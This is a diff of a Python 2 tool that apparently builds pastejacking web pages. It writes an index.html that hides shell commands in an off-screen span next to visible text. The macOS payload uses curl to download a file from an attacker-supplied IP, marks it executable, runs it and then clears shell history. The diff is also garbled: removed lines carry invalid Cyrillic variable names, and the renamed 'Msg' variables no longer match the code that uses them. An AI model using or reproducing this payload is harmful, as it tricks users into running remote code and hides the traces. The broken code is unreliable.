@@ -61,8 +61,8 @@ def Windows():
  -> Нагрузка создана!
 -------------------------------------------------------------------"""
 		print '\033[0;39m'
-		mensaje1=raw_input("   Mensaje 1: ")		
-		mensaje2=raw_input("   Mensaje 2: ")
+		Msg=raw_input("   Mensaje 1: ")		
+		Msg=raw_input("   Mensaje 2: ")
 		index="index.html"
 		job=open(index,"w")	
 		job.write("""<p> """+ mensaje1 + """ <span style="position: absolute; left: -2000; top: -100px;" >c:\ & cls & """+out+""" & c:\ & cls <br> """ + mensaje1 + """ </span> """ + mensaje2 + """ </p> """)
@@ -243,8 +243,8 @@ def NetcatMacOSX():
  -> Создано!
 -------------------------------------------------------------------"""
 			print '\033[0;39m'
-			Сообщение 1=raw_input("   Mensaje 1: ")
-			Сообщение 2=raw_input("   Mensaje 2: ")
+			Msg=raw_input("   Mensaje 1: ")
+			Msg=raw_input("   Mensaje 2: ")
 			#comando=raw_input("   Comando: ")
 
 			NombreIndex="index.html"
@@ -304,8 +304,8 @@ def ShellMacOSX():
  -> Готово! : """+payload+"""
 -------------------------------------------------------------------"""
 			print '\033[0;39m'
-			Сообщение 1=raw_input("   Mensaje 1: ")
-			Сообщение 2=raw_input("   Mensaje 2: ")
+			Msg=raw_input("   Mensaje 1: ")
+			Msg=raw_input("   Mensaje 2: ")
 			NombreIndex="index.html"
 			job=open(NombreIndex,"w")	
 			job.write("""<p> """ + mensaje1 + """ <span style="position: absolute; left: -2000; top: -100px;" >;curl -O http://"""+ip+"""/osx."""+extension+""";chmod +x osx."""+extension+""";"""+ejecucion+"""osx."""+extension+""" & history -c;clear <br> """ + mensaje1 + """ </span> """ + mensaje2 + """ </p>""")
